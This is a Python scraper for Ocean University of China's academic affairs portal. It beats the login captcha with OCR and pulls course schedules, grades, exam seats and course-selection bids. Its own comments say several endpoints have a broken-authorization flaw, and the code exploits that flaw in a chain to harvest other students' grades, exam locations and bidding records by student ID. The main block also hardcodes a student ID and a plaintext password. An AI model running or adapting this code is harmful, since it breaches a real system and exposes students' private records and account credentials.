# -*- coding:utf-8 -*-
from bs4 import BeautifulSoup
import json
import requests
import base64
import hashlib
import string
from PIL import Image
import pytesseract
import os

from app.utils import des_enc
from app.config import *


class Login:
    def __init__(self, username, password_md5, validate_code_len=4):
        self.valicode_code_num = 0  # 记录失败的验证码数量
        self.validate_code_len = validate_code_len  # 验证码的长度
        self.username = username
        self.password_md5 = password_md5

        self.index_url = 'http://jwgl.ouc.edu.cn/cas/login.action'
        self.login_url = 'http://jwgl.ouc.edu.cn/cas/logon.action'
        self.headers = {
            'User-Agent': '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'''
        }
        self.session = requests.Session()
        self.session.get(self.index_url, headers=self.headers)

    def _image_to_text(self, filename):
        '''
        使用pytesseract模块
        1000次验证码数据测试正确率
            1. 直接使用pyteeseract 29.24%
            2. 将图片转为灰度图像    30.46%
            3. 灰度图像，再进行二值化，阈值为100 15.78%
        '''
        if os.name == 'nt':
            pytesseract.pytesseract.tesseract_cmd = "C:\\Program Files (x86)\\Tesseract-OCR\\tesseract.exe"
        im = Image.open(filename)
        # im = im.convert("L")
        #
        # threshold = 100
        # table = []
        # for i in range(256):
        #     if i < threshold:
        #         table.append(0)
        #     else:
        #         table.append(1)
        # im = im.point(table, "1")

        try:
            text = pytesseract.image_to_string(im)
            return text
        except:
            pass
        return ''

    def _get_validate_code(self):
        """
        验证码识别结果处理机制：
            1. 先去除一些由于验证码识别错误而导致的特殊字符
            2. 验证识别结果是不是四个字符
            两个条件符合在进行登陆
        这里为了减少用错误的验证码去登陆教务系统的次数从而减少登陆时间
        """
        while True:
            wrong_chars = ' _-+|.:\';'
            correct_chars = string.ascii_lowercase + string.digits

            validate_url = 'http://jwgl.ouc.edu.cn/cas/genValidateCode'
            r = self.session.get(validate_url, headers=self.headers)
            f = open('./static/temp.png', 'wb')
            f.write(r.content)
            f.close()
            validate_code = self._image_to_text('./static/temp.png')
            # os.remove('temp.png')
            validate_code = validate_code.lower()
            print('[*] validate_code:' + validate_code)
            self.valicode_code_num = self.valicode_code_num + 1
            """
            由于无法确定验证码的准确性，所以当输入错误的用户名或者密码时，我们无法验证是什么原因导致的登陆失败
            这里我们认定当获得20次验证码后还未成功，就默认用户名或者密码错误
            """
            if self.valicode_code_num >= 20:
                return False

            for c in wrong_chars:
                validate_code = validate_code.replace(c, '')
            if len(validate_code) == self.validate_code_len:
                for i in validate_code:
                    if i not in correct_chars:
                        continue
                return validate_code

    def login(self, validate_code):
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36''',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'http://jwgl.ouc.edu.cn/cas/login.action',
            'Accept': 'text/plain, */*; q=0.01',
            'Origin': 'http://jwgl.ouc.edu.cn'
        }
        sessionid = self.session.cookies['JSESSIONID']
        rand_number = validate_code  # 验证码
        password_policy = '1'
        p_username = '_u' + rand_number
        p_password = '_p' + rand_number

        password = hashlib.md5(
            (self.password_md5 + (hashlib.md5(rand_number.lower().encode('utf-8'))).hexdigest()).encode(
                'utf-8')).hexdigest()
        username = base64.b64encode((self.username + ";;" + sessionid).encode('utf-8')).decode('utf-8')
        data = {
            p_username: username,
            p_password: password,
            'randnumber': rand_number,
            'isPasswordPolicy': password_policy
        }
        # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
        try:
            # self.session.post(self.login_url, headers=headers, data=data, proxies=proxies)
            self.session.post(self.login_url, headers=headers, data=data)
            r = self.session.get('http://jwgl.ouc.edu.cn/MainFrm.html', allow_redirects=False)
            print('[*] HTTP statue_code:' + str(r.status_code))
            if r.status_code == 200:
                print('[+] Validate_code accuracy: ' + str(round(100 / self.valicode_code_num, 2)) + '%')
                print('[+] Get validated cookie: ' + str(self.session.cookies.get_dict()))
                return True
        except Exception as e:
            print(e)

        return False

    def get_cookies(self):
        while True:
            code = self._get_validate_code()
            if code:
                if self.login(code):
                    return self.session.cookies
            else:
                return False
    # def test(self, num):
    #     flag = 0
    #     while True:
    #         print(self.valicode_code_num)
    #         if self.valicode_code_num > num:
    #             break
    #         if self.login(self._get_validate_code()):
    #             flag = flag + 1
    #
    #     print(str(flag / self.valicode_code_num))


class Data:
    def __init__(self, cookies):
        self.cookies = cookies

    def get_lessons_by_week(self, week=None):
        lessons_url = 'http://jwgl.ouc.edu.cn/frame/desk/showLessonScheduleDetailJson.action'
        headers = {
            'User-Agent': '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'''
        }
        if week:
            params = {
                'jxz': week
            }
            r = requests.get(lessons_url, params=params, headers=headers, cookies=self.cookies)
        else:
            r = requests.get(lessons_url, headers=headers, cookies=self.cookies)

        if r.status_code == 200:
            print('[+] get course!')
            soup = BeautifulSoup(r.text, 'html.parser')

        # 分析数据
        lessons = []
        tbody = soup.body.table.tbody
        trs = tbody.findAll('tr')
        for tr in trs:
            time_lesson_list = []
            tds = tr.findAll('td')
            for td in tds:
                text = td.getText()
                # u'\xa0' == &nbsp html实体编码中的空格
                text = text.replace('\t', '').replace('\r', '').replace('\n', '').replace(u'\xa0', 'null')
                text = text.strip(' ')
                if len(text) > 2:  # 去掉时间和第几节课
                    time_lesson_list.append(text)
            lessons.append(time_lesson_list)

        json_data = json.dumps(lessons, ensure_ascii=False)  # 不使用ascii编码，中文就能显示
        return json_data

    def get_grades(self, username):
        """
        此操作具有越权漏洞
        :param username: 学号
        :return: json数据
        """
        grades_url = 'http://jwgl.ouc.edu.cn/student/xscj.stuckcj_data.jsp'
        headers = {
            'User-Agent': '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36''',
            'Referer': 'http://jwgl.ouc.edu.cn/student/xscj.stuckcj.jsp?menucode=JW130705'
        }
        params = 'xn=2018&xn1=2019&xq=1&ysyx=yscj&sjxz=sjxz1&userCode=' + username + '&ysyxS=on&sjxzS=on'
        encrypt_url = 'http://jwgl.ouc.edu.cn/custom/js/SetKingoEncypt.jsp'
        r = requests.get(encrypt_url, headers=headers, cookies=self.cookies)
        des_key = r.text.split(';')[0].split('\'')[1]
        timestamp = r.text.split(';')[1].split('\'')[1]
        token = hashlib.md5(((hashlib.md5(params.encode('utf-8'))).hexdigest() + (
            hashlib.md5(timestamp.encode('utf-8'))).hexdigest()).encode('utf-8')).hexdigest()
        params = base64.b64encode(
            (des_enc.utf16to8((des_enc.desEnc(params, des_key, None, None)))).encode('utf-8')).decode('utf-8')
        r = requests.get(grades_url, headers=headers, params={'params': params, 'token': token, 'timestamp': timestamp},
                         cookies=self.cookies)
        if r.status_code == 200:
            print('[+] get grades!')
            soup = BeautifulSoup(r.text, 'html.parser')

            # 分析数据
            all_course_grades = []
            tables = soup.body.findAll('table')
            for table in tables:
                if table.tbody:  # 异常处理很重要
                    tbody = table.tbody
                    trs = tbody.findAll('tr')
                    for tr in trs:
                        tds = tr.findAll('td')
                        course_name = tds[1].getText().split(']')[1]
                        course_credit = tds[2].getText()
                        course_grade = tds[6].getText()

                        all_course_grades.append([course_name, course_credit, course_grade])
            json_data = json.dumps(all_course_grades, ensure_ascii=False)  # 不使用ascii编码，中文就能显示
            return json_data
        return False

    def get_exam(self, username):
        """
        此操作具有越权漏洞
        :param username: 学号
        :return: json数据
        """
        exam_url = 'http://jwgl.ouc.edu.cn/taglib/DataTable.jsp?tableId=2538'
        headers = {
            'User-Agent': '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36''',
            'Referer': 'http: // jwgl.ouc.edu.cn / student / ksap.ksapb.html?menucode = JW130603'
        }
        data = {
            'initQry': '0',
            'xh': username,
            'xn': '2018',
            'xq': '1',
            'xnxq': '2018-1',
            'kslcdm': '2'
        }
        r = requests.post(exam_url, headers=headers, data=data, cookies=self.cookies)
        if r.status_code == 200:
            print('[+] get exam!')
            soup = BeautifulSoup(r.text, 'html.parser')
            # print(soup)
            try:
                exams = []
                tbody = soup.table.tbody
                trs = tbody.findAll('tr')
                for tr in trs:
                    tds = tr.findAll('td')
                    course_name = tds[1].getText().split(']')[1]
                    exam_time = tds[6].getText()
                    exam_room = tds[7].getText()
                    exam_seat = tds[8].getText()
                    exams.append([course_name, exam_time, exam_room, exam_seat])

                json_data = json.dumps(exams, ensure_ascii=False)  # 不使用ascii编码，中文就能显示
                return json_data
            except:
                return False

    """
    通过越权漏洞，构造利用链，获取选课情况
    """

    def get_select_lesson(self, username):
        url = 'http://jwgl.ouc.edu.cn/taglib/DataTable.jsp?tableId=6093'
        headers = {
            'User-Agent': '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36''',
            'Referer': 'http://jwgl.ouc.edu.cn/student/wsxk.axkhksxk.html?menucode=JW130410'
        }
        data = {
            'electiveCourseForm.xktype': '2',
            'electiveCourseForm.xn': '',
            'electiveCourseForm.xq': '',
            'electiveCourseForm.xh': '',
            'electiveCourseForm.nj': '2016',
            'electiveCourseForm.zydm': '0096',
            'xqdm': '2',
            'electiveCourseForm.kcdm': '',
            'electiveCourseForm.kclb1': '',
            'electiveCourseForm.kclb2': '',
            'electiveCourseForm.khfs': '',
            'electiveCourseForm.skbjdm': '',
            'electiveCourseForm.xf': '',
            'electiveCourseForm.is_buy_book': '',
            'electiveCourseForm.is_cx': '',
            'electiveCourseForm.is_yxtj': '',
            'electiveCourseForm.xk_points': '',
            'xn': xn,
            'xn1': '',
            '_xq': '',
            'xq_m': '0',
            'xq': '0',
            'xh': username,
            'kcdm': '',
            'zc': '',
            'electiveCourseForm.xkdetails': '',
            'hidOption': '',
            'xkh': '',
            'kcmc': '',
            'kcxf': '',
            'kkxq': '',
            'kcrkjs': '',
            'skfs': '',
            'xxyx': '',
            'sksj': '',
            'skdd': '',
            'point_total': '100',
            'point_used': '100',
            'point_canused': '0',
            'text_weight': '0',
            'ck_gmjc': 'on',
            'ck_skbtj': 'on'
        }
        try:
            r = requests.post(url, headers=headers, data=data, cookies=self.cookies)
            soup = BeautifulSoup(r.text, 'html.parser')
            tbody = soup.body.table.tbody
            trs = tbody.findAll('tr')
            lesson_list = []
            for tr in trs:
                tds = tr.findAll('td')
                course_name = tds[1].getText().split(']')[1]
                course_id = tds[6].getText()
                course_teacher = tds[7].getText()
                money = tds[8].getText()
                lesson_list.append([course_name, course_id, course_teacher, money])
        except:
            print('[-] one user not get!')

        return lesson_list

    def get_select_username_by_course_id(self, course_id):
        url = 'http://jwgl.ouc.edu.cn/taglib/DataTable.jsp?tableId=3241&type=skbjdm'
        headers = {
            'User-Agent': '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36''',
            'Referer': 'http://jwgl.ouc.edu.cn/common/popmsg/popmsg.sendOnlineMessage.jsp'
        }
        data = {
            'hidOption': '',
            'hidKey': '',
            'userId': '16020032029',
            'roletype': '',
            'jsrdm': '',
            'jsrmc': '',
            'nj': xn,
            'yhdm': '',
            'emptyFlag': '0',
            'xm': '',
            'xn': '',
            'xq': '',
            'style': 'SKBJDM',
            'bmdm': '',
            'gradeController': 'on',
            'nj2': xn,
            'yxbdm': '',
            'sel_role': 'ADM000',
            'xnxq': xnxq,
            'sel_skbjdm': course_id,
            'queryInfo': '',
            '_xxbt': '',
            'xxbt': '',
            '_xxnr': '',
            'xxnr': '',
            'fjmc': ''
        }
        r = requests.post(url, headers=headers, data=data, cookies=self.cookies)
        soup = BeautifulSoup(r.text, 'html.parser')
        tbody = soup.body.table.tbody
        trs = tbody.findAll('tr')
        username_list = []
        for tr in trs:
            tds = tr.findAll('td')
            username_list.append([tds[1].getText(), tds[2].getText()])
        return username_list

    def get_money_list_by_course_id(self, course_id):
        users = self.get_select_username_by_course_id(course_id)
        money = []
        info = []
        for u in users:
            lessons = self.get_select_lesson(u[0])
            for l in lessons:
                if l[1] == course_id:
                    info.append([u[1], int(l[3])])
                    money.append(int(l[3]))
        money.sort(reverse=True)
        return money, info

    def get_all_select_lesson_money_info_by_username(self, username):
        my_lesson = self.get_select_lesson(username)
        print('[*] 已选课程:')
        my_lesson_info = []
        for course in my_lesson:
            print('***********************************************')
            print('     ' + course[0] + '  投币' + str(course[3]))
            money, info = self.get_money_list_by_course_id(course[1])
            print('选课信息：')
            for i in info:
                print(' ' + i[0] + ' ' + str(i[1]) + '币')
            print('选课币总览：')
            print(money)
        return my_lesson_info


if __name__ == '__main__':
    user = Login('16020032029', hashlib.md5('zhu538592'.encode('utf-8')).hexdigest())
    data = Data(user.get_cookies())
    data.get_all_select_lesson_money_info_by_username('16020032029')
